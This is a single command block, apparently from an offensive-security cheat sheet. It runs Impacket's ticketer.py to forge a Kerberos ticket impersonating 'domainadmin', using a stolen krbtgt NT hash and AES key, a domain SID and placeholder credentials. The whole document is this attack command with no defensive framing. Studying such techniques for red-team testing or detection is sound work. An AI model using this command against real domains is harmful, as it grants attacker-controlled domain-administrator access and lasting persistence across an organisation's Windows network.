




```
ticketer.py -request -impersonate 'domainadmin' \
-domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' \
-nthash 'krbtgt NT hash' -aesKey 'krbtgt AES key' \
-user-id '1115' -domain-sid 'S-1-5-21-...' \
'baduser'
```